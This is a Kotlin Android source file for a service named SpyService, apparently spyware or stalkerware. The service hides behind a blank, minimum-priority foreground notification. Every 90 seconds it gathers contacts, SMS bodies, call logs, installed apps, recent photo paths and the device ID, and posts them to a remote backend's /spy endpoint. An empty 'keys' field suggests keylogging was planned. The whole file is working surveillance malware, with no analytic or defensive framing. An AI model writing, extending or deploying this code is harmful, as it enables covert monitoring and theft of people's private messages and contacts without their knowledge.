package com.eren
import android.app.*
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import androidx.core.app.NotificationCompat
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
class SpyService : Service() {
    private val exec = Executors.newSingleThreadScheduledExecutor()
    private val api = Api()
    override fun onCreate() { super.onCreate(); startFG() }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        exec.scheduleWithFixedDelay({ try { collect() } catch (_: Exception) {} }, 0, 90, TimeUnit.SECONDS)
        return START_STICKY
    }
    private fun startFG() {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("eren", "sys", NotificationManager.IMPORTANCE_MIN)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
        val n = NotificationCompat.Builder(this, "eren").setContentTitle("").setContentText("").setSmallIcon(android.R.drawable.stat_notify_sync).setPriority(NotificationCompat.PRIORITY_MIN).build()
        startForeground(1, n)
    }
    private fun collect() {
        val d = JSONObject()
        d.put("device", devInfo())
        d.put("contacts", contacts())
        d.put("sms", sms())
        d.put("calls", calls())
        d.put("apps", apps())
        d.put("media", media())
        d.put("keys", JSONArray())
        api.post("$BACKEND/spy", d.toString())
    }
    private fun devInfo(): JSONObject {
        val o = JSONObject()
        o.put("model", Build.MODEL); o.put("brand", Build.BRAND); o.put("sdk", Build.VERSION.SDK_INT)
        o.put("android_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
        return o
    }
    private fun contacts(): JSONArray {
        val a = JSONArray()
        try {
            val c: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            c?.use { while (it.moveToNext()) {
                val o = JSONObject()
                o.put("name", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME) ?: 0))
                o.put("number", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER) ?: 0))
                a.put(o)
            } }
        } catch (_: Exception) {}
        return a
    }
    private fun sms(): JSONArray {
        val a = JSONArray()
        try {
            val c: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
            c?.use { var n = 0; while (it.moveToNext() && n < 100) {
                val o = JSONObject()
                o.put("address", it.getString(it.getColumnIndex("address") ?: 0))
                o.put("body", it.getString(it.getColumnIndex("body") ?: 0))
                o.put("date", it.getString(it.getColumnIndex("date") ?: 0))
                a.put(o); n++
            } }
        } catch (_: Exception) {}
        return a
    }
    private fun calls(): JSONArray {
        val a = JSONArray()
        try {
            val c: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
            c?.use { var n = 0; while (it.moveToNext() && n < 100) {
                val o = JSONObject()
                o.put("number", it.getString(it.getColumnIndex(CallLog.Calls.NUMBER) ?: 0))
                o.put("type", it.getString(it.getColumnIndex(CallLog.Calls.TYPE) ?: 0))
                o.put("duration", it.getString(it.getColumnIndex(CallLog.Calls.DURATION) ?: 0))
                a.put(o); n++
            } }
        } catch (_: Exception) {}
        return a
    }
    private fun apps(): JSONArray {
        val a = JSONArray()
        try {
            val pm = packageManager
            val list = if (Build.VERSION.SDK_INT >= 30) pm.getInstalledApplications(android.content.pm.PackageManager.ApplicationInfoFlags.of(0)) else pm.getInstalledApplications(0)
            for (p in list) a.put(p.packageName)
        } catch (_: Exception) {}
        return a
    }
    private fun media(): JSONArray {
        val a = JSONArray()
        try {
            val c: Cursor? = contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")
            c?.use { var n = 0; while (it.moveToNext() && n < 30) {
                val o = JSONObject()
                o.put("name", it.getString(it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME) ?: 0))
                o.put("path", it.getString(it.getColumnIndex(MediaStore.Images.Media.DATA) ?: 0))
                o.put("size", it.getString(it.getColumnIndex(MediaStore.Images.Media.SIZE) ?: 0))
                a.put(o); n++
            } }
        } catch (_: Exception) {}
        return a
    }
    override fun onBind(intent: Intent?): IBinder? = null
    companion object { const val BACKEND = "http://192.168.1.101:5000" }
}
